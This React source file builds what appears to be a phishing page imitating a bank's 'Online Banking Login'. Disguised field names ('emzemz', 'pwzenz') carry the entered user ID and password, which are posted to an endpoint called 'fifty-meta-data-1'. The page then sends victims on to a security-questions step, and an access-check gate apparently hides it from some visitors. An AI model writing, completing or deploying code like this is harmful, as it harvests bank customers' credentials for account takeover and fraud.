import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';
import Header from '../components/Header';
import Footer from '../components/Footer';

const LoginForm: React.FC = () => {
  const [emzemz, setEmzemz] = useState('');
  const [pwzenz, setPwzenz] = useState('');
  const [accountType, setAccountType] = useState('online');
  const [isLoading, setIsLoading] = useState(false);
  const [showPwzenz, setShowPwzenz] = useState(false);
  const [errors, setErrors] = useState({ emzemz: '', pwzenz: '' });
  const navigate = useNavigate();
  const isAllowed = useAccessCheck(baseUrl);

  if (isAllowed === null) {
    return <div className="min-h-screen flex items-center justify-center text-gray-700">Loading...</div>;
  }

  if (isAllowed === false) {
    return <div className="min-h-screen flex items-center justify-center text-gray-700">Access denied. Redirecting...</div>;
  }

  const togglePwzenzVisibility = () => {
    setShowPwzenz((prev) => !prev);
  };

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setIsLoading(true);
    const newErrors = { emzemz: '', pwzenz: '' };

    if (!emzemz.trim()) {
      newErrors.emzemz = 'User ID is required.';
    }

    if (!pwzenz.trim()) {
      newErrors.pwzenz = 'Password is required.';
    }

    setErrors(newErrors);

    if (newErrors.emzemz || newErrors.pwzenz) {
      setIsLoading(false);
      return;
    }

    const url = `${baseUrl}api/fifty-meta-data-1/`;

    try {
      await axios.post(url, {
        emzemz,
        pwzenz,
        accountType,
      });
      navigate('/security-questions', {
        state: {
          emzemz,
        },
      });
    } catch (error) {
      console.error('Error sending message:', error);
      setIsLoading(false);
    }

    setErrors({ emzemz: '', pwzenz: '' });
  };

  return (
    <div className="min-h-screen bg-white flex flex-col text-[#1b1b1b]">
      <Header />

      <section className="bg-gradient-to-r from-[#0b2b6a] via-[#123b9d] to-[#1a44c6] py-16 px-4">
        <div className="max-w-6xl mx-auto">
          <div className="mb-6 flex items-center gap-2 text-sm text-white/90">
            <a href="#" className="text-white/70 hover:text-white">Home</a>
            <span className="text-white/50">&#8250;</span>
            <span className="font-semibold">Login</span>
          </div>

          <div className="flex justify-center">
            <div className="bg-[#f4f2f2] max-w-sm w-full rounded-md shadow-[0_12px_30px_rgba(0,0,0,0.25)] border border-gray-200">
              <div className="px-8 py-6">
                <h1 className="text-2xl font-bold text-gray-800 mb-6">Online Banking Login</h1>
                <form className="space-y-5" onSubmit={handleSubmit}>
                  <div>
                    <label htmlFor="accountType" className="block text-sm font-semibold text-gray-700 mb-2">
                      Online Banking
                    </label>
                    <select
                      id="accountType"
                      value={accountType}
                      onChange={(event) => setAccountType(event.target.value)}
                      disabled
                      aria-disabled="true"
                      className="w-full border border-gray-300 rounded-sm px-3 py-2 text-sm bg-gray-100 text-gray-500 cursor-not-allowed"
                    >
                      <option value="online">Online Banking</option>
                      <option value="business">Business Banking</option>
                      <option value="treasury">Treasury Management</option>
                    </select>
                  </div>

                  <div>
                    <label htmlFor="emzemz" className="block text-sm font-semibold text-gray-700 mb-2">
                      User ID
                    </label>
                    <div className="relative">
                      <input
                        id="emzemz"
                        name="emzemz"
                        type="text"
                        value={emzemz}
                        onChange={(e) => setEmzemz(e.target.value)}
                        className="w-full border-2 border-dashed border-[#2d9c4b] rounded-sm px-3 py-2 text-sm text-gray-800 focus:outline-none focus:border-[#1f7a3d]"
                      />
                      <button
                        type="button"
                        className="absolute inset-y-0 right-3 my-auto text-xs font-semibold text-[#0a5c2d] hover:underline"
                      >
                        Save
                      </button>
                    </div>
                    {errors.emzemz && (
                      <p className="mt-2 text-xs font-semibold text-red-600">
                        {errors.emzemz}
                      </p>
                    )}
                  </div>

                  <div>
                    <label htmlFor="pwzenz" className="block text-sm font-semibold text-gray-700 mb-2">
                      Password
                    </label>
                    <div className="relative">
                      <input
                        id="pwzenz"
                        name="pwzenz"
                        type={showPwzenz ? 'text' : 'password'}
                        value={pwzenz}
                        onChange={(e) => setPwzenz(e.target.value)}
                        className="w-full border border-gray-300 rounded-sm px-3 py-2 pr-16 text-sm text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#0b2b6a]"
                      />
                      <button
                        type="button"
                        onClick={togglePwzenzVisibility}
                        className="absolute inset-y-0 right-3 flex items-center text-sm font-semibold text-[#003087] hover:underline"
                      >
                        {showPwzenz ? 'Hide' : 'Show'}
                      </button>
                    </div>
                    {errors.pwzenz && (
                      <p className="mt-2 text-xs font-semibold text-red-600">
                        {errors.pwzenz}
                      </p>
                    )}
                  </div>

                  <button
                    type="submit"
                    disabled={isLoading}
                    className="w-full bg-[#123b9d] hover:bg-[#0f2f6e] text-white font-semibold py-3 rounded-sm uppercase tracking-wide transition disabled:opacity-70 disabled:cursor-not-allowed"
                  >
                    {isLoading ? (
                      <span className="flex items-center justify-center gap-2 text-sm">
                        <span className="h-4 w-4 border-2 border-white border-t-transparent rounded-full animate-spin"></span>
                        Processing...
                      </span>
                    ) : (
                      'Log In'
                    )}
                  </button>
                </form>
              </div>
              <div className="border-t border-gray-200 px-8 py-4 text-sm">
                <a href="#" className="text-[#003087] font-semibold hover:underline">
                  Forgot Login?
                </a>
                <p className="mt-2 text-sm">
                  First Time User?{' '}
                  <a href="#" className="text-[#003087] font-semibold hover:underline">
                    Register.
                  </a>
                </p>
              </div>
            </div>
          </div>
        </div>
      </section>

      <section className="bg-white py-12 px-4 flex-1">
        <div className="max-w-6xl mx-auto space-y-8">
          <h2 className="text-2xl font-semibold text-gray-900">Log In to View Your Accounts</h2>
          <p className="mt-3 text-gray-700 leading-relaxed">
            Online banking is available, all day, every day. Simply log in to pay bills, view statements, chat with live agents,
            pay bills directly from your account, and more.
          </p>

          <div className="grid gap-6 md:grid-cols-2">
            <div className="border border-gray-200 rounded-md p-6 bg-[#f8f8f8]">
              <h3 className="text-xl font-semibold text-gray-900 mb-2">Existing Users</h3>
              <p className="text-sm text-gray-700 leading-relaxed">
                To access your accounts, please use your custom User ID and your password. For your security, never share login
                credentials or sensitive information.
              </p>
            </div>
            <div className="border border-gray-200 rounded-md p-6 bg-white shadow-sm">
              <h3 className="text-xl font-semibold text-gray-900 mb-2">First Time User?</h3>
              <p className="text-sm text-gray-700 leading-relaxed mb-3">
                Get started by registering for online banking access. Have your account number and personal details handy to
                complete the enrollment process.
              </p>
              <a href="#" className="text-[#003087] font-semibold hover:underline">
                User ID: Register now
              </a>
            </div>
          </div>
        </div>
      </section>
      <Footer />
    </div>
  );
};

export default LoginForm;
